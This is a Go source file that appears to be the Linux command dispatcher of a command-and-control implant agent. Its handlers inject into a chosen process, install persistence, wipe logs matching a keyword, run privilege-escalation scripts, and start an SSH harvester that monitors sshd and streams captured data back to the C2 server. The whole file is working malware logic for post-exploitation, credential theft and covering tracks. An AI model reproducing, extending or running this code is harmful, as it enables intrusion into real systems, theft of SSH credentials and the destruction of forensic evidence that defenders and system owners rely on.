//go:build linux
// +build linux

package agent

import (
	"context"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/spf13/cobra"
)

// runInjectLinux implements: !inject --method <method> --pid <pid> --checksum <checksum>
func runInjectLinux(cmd *cobra.Command, args []string) {
	method, _ := cmd.Flags().GetString("method")
	pid, _ := cmd.Flags().GetString("pid")
	checksum, _ := cmd.Flags().GetString("checksum")
	if method == "" || pid == "" || checksum == "" {
		SendCmdRespToC2("Error: args error", cmd, args)
		return
	}
	pidInt, err := strconv.ParseInt(pid, 10, 32)
	if err != nil {
		log.Println("Invalid pid")
		SendCmdRespToC2("Error: invalid pid", cmd, args)
		return
	}
	err = InjectorHandler(int(pidInt), method, checksum)
	if err != nil {
		SendCmdRespToC2("Error: "+err.Error(), cmd, args)
		return
	}
	SendCmdRespToC2(method+": success", cmd, args)
}

// runPersistenceLinux implements: !persistence --method <method>
func runPersistenceLinux(cmd *cobra.Command, args []string) {
	method, _ := cmd.Flags().GetString("method")
	if method == "" {
		SendCmdRespToC2("Error: args error", cmd, args)
		return
	}
	if method == "all" {
		err := PersistAllInOne()
		if err != nil {
			log.Println(err)
			SendCmdRespToC2("Some has failed: "+err.Error(), cmd, args)
		} else {
			SendCmdRespToC2("Success", cmd, args)
		}
		return
	} else {
		if persistMethod, exists := PersistMethods[method]; exists {
			err := persistMethod()
			if err != nil {
				log.Println(err)
				SendCmdRespToC2("Error: "+err.Error(), cmd, args)
			} else {
				SendCmdRespToC2("Success", cmd, args)
			}
		} else {
			SendCmdRespToC2("Error: No such method available", cmd, args)
		}
	}
}

// runGetRootLinux implements: !get_root
func runGetRootLinux(cmd *cobra.Command, args []string) {
	if os.Geteuid() == 0 {
		SendCmdRespToC2("Warning: You already have root!", cmd, args)
	} else {
		SendCmdRespToC2("Deprecated", cmd, args)
	}
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		SendCmdRespToC2("Error: args error", cmd, args)
		return
	}
	err := CleanAllByKeyword(keyword)
	if err != nil {
		SendCmdRespToC2(err.Error(), cmd, args)
		return
	}
	SendCmdRespToC2("Done", cmd, args)
}

// runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
func runLPELinux(cmd *cobra.Command, args []string) {
	scriptName, _ := cmd.Flags().GetString("script_name")
	checksum, _ := cmd.Flags().GetString("checksum")
	if scriptName == "" || checksum == "" {
		SendCmdRespToC2("Error: args error", cmd, args)
		return
	}
	out := runLPEHelper(scriptName, checksum)
	SendCmdRespToC2(out, cmd, args)
}

// runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
	codePattern, _ := cmd.Flags().GetString("code_pattern")
	regName, _ := cmd.Flags().GetString("reg_name")
	stop, _ := cmd.Flags().GetBool("stop")
	if stop && SshHarvesterCancel != nil {
		SshHarvesterCancel()
		SendCmdRespToC2("SSH harvester stopped", cmd, args)
		return
	}
	codePatternBytes, err := hex.DecodeString(codePattern)
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("Error parsing hex string: %v", err), cmd, args)
		return
	}
	if SshHarvesterCtx == nil {
		SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
	}
	harvesterLogStream := make(chan string, 4096)
	go sshd_monitor(harvesterLogStream, codePatternBytes, regName)
	go func() {
		for SshHarvesterCtx.Err() == nil {
			out := <-harvesterLogStream
			SendCmdRespToC2(out, cmd, args)
		}
		SendCmdRespToC2("SSH harvester log stream exited", cmd, args)
	}()
}
